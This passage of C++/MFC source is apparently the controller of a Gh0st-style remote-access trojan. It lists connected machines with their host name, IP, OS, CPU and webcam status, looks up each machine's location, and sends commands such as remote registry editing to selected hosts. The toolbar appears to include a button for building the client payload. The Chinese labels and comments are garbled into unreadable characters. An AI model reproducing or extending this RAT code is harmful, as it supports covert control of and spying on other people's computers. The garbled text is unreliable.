		return ;      // fail to create
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);             
	m_wndStatusBar.MoveWindow(rc);                   
}

void CPCRemoteDlg::CreateToolBar(void)
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);
	RECT rt,rtMain;
	GetWindowRect(&rtMain);
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);

	m_ToolBar.SetButtonText(0,"�ն˹���");  
	m_ToolBar.SetButtonText(1,"���̹���"); 
	m_ToolBar.SetButtonText(2,"���ڹ���"); 
	m_ToolBar.SetButtonText(3,"�������"); 
	m_ToolBar.SetButtonText(4,"�ļ�����"); 
	m_ToolBar.SetButtonText(5,"��������"); 
	m_ToolBar.SetButtonText(6,"��Ƶ����"); 
	m_ToolBar.SetButtonText(7,"�������"); 
	m_ToolBar.SetButtonText(8,"ע������"); 
	m_ToolBar.SetButtonText(10,"��������"); 
	m_ToolBar.SetButtonText(11,"���ɷ����"); 
	m_ToolBar.SetButtonText(12,"����"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
}


void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: // click or dbclick left button on icon
	case WM_LBUTTONDBLCLK: // should show desktop
		if (!IsWindowVisible()) 
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: // click right button, show menu
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
			point.x, point.y, this, NULL); 
		PostMessage(WM_USER, 0, 0);
		break;
	}
}

void CPCRemoteDlg::OnNotifyClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnNotifyShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}


void CPCRemoteDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	Shell_NotifyIcon(NIM_DELETE, &nid);
	CDialogEx::OnClose();
}


LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext	*pContext = (ClientContext *)lParam;    //ע�������  ClientContext  ���Ƿ�������ʱ���б���ȡ��������

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
		//int nCnt = m_pListCtrl->GetItemCount();

		// ���Ϸ������ݰ�
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		//CString	str;
		//str.Format("%d", m_nCount++);	

		// IP��ַ
		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// ����IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		//m_pListCtrl->SetItemText(i, 1, IPAddress);
		strIP=IPAddress;

		// ����IP
		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		//strAddr=inet_ntoa(LoginInfo->IPAddress);
		// ������
		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
		strPCName=LoginInfo->HostName;
		// ϵͳ

		////////////////////////////////////////////////////////////////////////////////////////
		// ��ʾ�����Ϣ
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
			(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		//m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		//m_pListCtrl->SetItemText(i, 5, str);

		// Speed
		strPing.Format("%d", LoginInfo->dwSpeed);
		//m_pListCtrl->SetItemText(i, 6, str);


		strVideo = LoginInfo->bIsWebCam ? "��" : "--";
		//m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			strAddr = m_QQwry->IPtoAdd(IPAddress);

			//strToolTipsText += "\nArea: ";
			//strToolTipsText += str;
		}
		// ָ��Ψһ��ʶ
		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //���ｫ����˵��׽��ֵ���Ϣ�����б��б���
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,pContext);
	}catch(...){}

	return 0;
}

void CPCRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{

	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_CList_Online.GetNextSelectedItem(pos);                          //lang2.1_2
		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); //���б���Ŀ��ȡ��ClientContext�ṹ��
		// ���ͻ���������б����ݰ�                                                 //�鿴  ClientContext�ṹ��
		m_iocpServer->Send(pContext, pData, nSize);      //����  m_iocpServer  ��Send ������������  �鿴m_iocpServer ����

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}


void CPCRemoteDlg::OnOnlineRegedit()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);  //��̬����CSystemDlg

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());      //�����Ի���
	dlg->ShowWindow(SW_SHOW);                      //��ʾ�Ի���

	pContext->m_Dialog[0] = REGEDIT_DLG;              //���ֵ����������ٴη�������ʱ�ı�ʶ
	pContext->m_Dialog[1] = (int)dlg;
	//�ȿ�һ������Ի���Ľ����ٿ�����Ի�����Ĺ��캯��
	return 0;
}